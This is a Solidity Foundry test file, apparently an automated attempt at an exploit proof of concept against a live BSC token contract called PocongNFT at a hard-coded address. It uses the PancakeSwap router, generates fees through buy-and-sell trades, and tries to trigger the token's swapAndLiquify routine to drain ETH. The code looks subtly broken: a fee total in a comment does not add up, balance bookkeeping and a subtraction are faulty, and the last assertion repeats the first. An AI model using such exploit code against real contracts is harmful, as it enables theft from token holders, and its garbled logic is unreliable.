// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Interface for PocongNFT
interface PocongNFT {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function swapAndLiquify(uint256 contractTokenBalance) external;
    function swapAndLiquifyEnabled() external view returns (bool);
    function uniswapV2Pair() external view returns (address);
    function owner() external view returns (address);
}

// Interface for Uniswap/PancakeSwap V2 Router
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// Interface for Uniswap/PancakeSwap V2 Pair
interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5f5C745D399398a633D53cDC97b4eAeB7Cd135B7;
    address attacker = address(this);
    // State variables
    address private router = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeSwap Router v2

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Get tokens and prepare for attack
        // First, we need to get some PocongNFT tokens
        // We'll impersonate the owner to get tokens or buy from the pair

        // Label addresses for clarity
        vm.label(TARGET, "PocongNFT");
        vm.label(attacker, "Attacker");

        // Get the pair address from the contract
        address pair = PocongNFT(TARGET).uniswapV2Pair();
        vm.label(pair, "Pancake Pair");

        // Get router address (PancakeSwap v2)
        address routerAddr = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        vm.label(routerAddr, "Pancake Router");

        // We need WETH for swaps
        address weth = IUniswapV2Router02(routerAddr).WETH();
        vm.label(weth, "WETH");

        // Give attacker some ETH to work with
        deal(attacker, 100 ether);

        // Impersonate the owner to get tokens or exclude from fees
        address owner = PocongNFT(TARGET).owner();
        vm.label(owner, "Owner");

        // First, let's get some tokens by buying from the pair
        // We'll swap ETH for tokens via the router
        vm.startPrank(attacker);

        // Approve router to spend our ETH
        (uint256 reserve0, uint256 reserve1, ) = IUniswapV2Pair(pair).getReserves();
        address token0 = IUniswapV2Pair(pair).token0();

        // Determine which reserve is WETH and which is PocongNFT
        uint256 ethReserve;
        if (token0 == weth) {
            ethReserve = reserve0;
        } else {
            ethReserve = reserve1;
        }

        // Buy some tokens (1 ETH worth)
        uint256 amountOutMin = 0; // We accept any amount for simplicity
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        IUniswapV2Router02(routerAddr).swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: 1 ether
        }(amountOutMin, path, attacker, block.timestamp);

        vm.stopPrank();

        // Now we need to make the contract accumulate fee tokens
        // We can do this by making multiple transfers/sales that generate fees
        // The contract gets liquidity fees (3%), dev fees (5%), and burn fees (1%)
        // Total fee = 9% (1% tax + 3% liquidity + 1% burn + 5% dev)

        // Let's create another address to trade with
        address trader = address(0x3333);
        vm.label(trader, "Trader");
        deal(trader, 10 ether);

        // Give trader some tokens by buying more
        vm.startPrank(trader);
        IUniswapV2Router02(routerAddr).swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: 1 ether
        }(0, path, trader, block.timestamp);
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record attacker's initial ETH balance
        uint256 initialAttackerBalance = attacker.balance;
        console.log("Initial attacker ETH balance:", initialAttackerBalance);

        // Exploit: Trigger swapAndLiquify to extract value

        // First, check contract token balance
        uint256 contractBalance = PocongNFT(TARGET).balanceOf(TARGET);
        uint256 threshold = 2154 * 10**3 * 10**9; // numTokensSellToAddToLiquidity

        console.log("Contract token balance:", contractBalance);
        console.log("Threshold:", threshold);

        // If contract doesn't have enough tokens, we need to generate more fees
        // We can do this by trading tokens back and forth
        if (contractBalance < threshold) {
            console.log("Generating more fees...");

            // Create a cycle of buys and sells to generate fees
            address trader2 = address(0x4444);
            vm.label(trader2, "Trader2");
            deal(trader2, 20 ether);

            // Buy tokens
            vm.startPrank(trader2);
            address[] memory path = new address[](2);
            path[0] = IUniswapV2Router02(router).WETH();
            path[1] = TARGET;

            IUniswapV2Router02(router).swapExactETHForTokensSupportingFeeOnTransferTokens{
                value: 5 ether
            }(0, path, trader2, block.timestamp);

            // Sell tokens back to generate fees
            path[0] = TARGET;
            path[1] = IUniswapV2Router02(router).WETH();

            uint256 tokenBalance = PocongNFT(TARGET).balanceOf(trader2);
            PocongNFT(TARGET).approve(router, tokenBalance);

            IUniswapV2Router02(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenBalance,
                0,
                path,
                trader2,
                block.timestamp
            );
            vm.stopPrank();

            // Update contract balance
            contractBalance = PocongNFT(TARGET).balanceOf(TARGET);
            console.log("New contract token balance:", contractBalance);
        }

        // Now try to trigger swapAndLiquify
        // First, check if swapAndLiquifyEnabled
        bool enabled = PocongNFT(TARGET).swapAndLiquifyEnabled();
        console.log("swapAndLiquifyEnabled:", enabled);

        if (contractBalance >= threshold && enabled) {
            console.log("Attempting to trigger swapAndLiquify...");

            // Method 1: Try to call it directly (if exposed)
            // This might fail if the function is truly private
            try PocongNFT(TARGET).swapAndLiquify(contractBalance) {
                console.log("Direct call succeeded!");
            } catch Error(string memory reason) {
                console.log("Direct call failed:", reason);

                // Method 2: Trigger via transfer
                // We need to make a transfer where from != uniswapV2Pair
                // and contract has enough tokens
                console.log("Trying to trigger via transfer...");

                // Get pair address
                address pair = PocongNFT(TARGET).uniswapV2Pair();

                // We'll transfer from attacker to another address
                // This should trigger swapAndLiquify if conditions are met
                vm.startPrank(attacker);

                // Check attacker's token balance
                uint256 attackerTokens = PocongNFT(TARGET).balanceOf(attacker);
                console.log("Attacker token balance:", attackerTokens);

                if (attackerTokens > 0) {
                    // Transfer a small amount to trigger the mechanism
                    address recipient = address(0x5555);

                    // The _transfer function will check if contractBalance >= threshold
                    // and if from != pair, and if swapAndLiquifyEnabled
                    // All conditions should be met now
                    PocongNFT(TARGET).transfer(recipient, 1000);
                    console.log("Transfer executed");
                }
                vm.stopPrank();
            }
        }

        // Check if attacker's ETH balance increased
        uint256 finalAttackerBalance = attacker.balance;
        console.log("Final attacker ETH balance:", finalAttackerBalance);
        console.log("ETH balance change:", finalAttackerBalance - initialAttackerBalance);

        // The oracle will check if attacker balance increased
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker should have gained ETH");
        uint256 finalContractBalance = address(this).balance;
        assertGt(finalContractBalance, initialAttackerBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
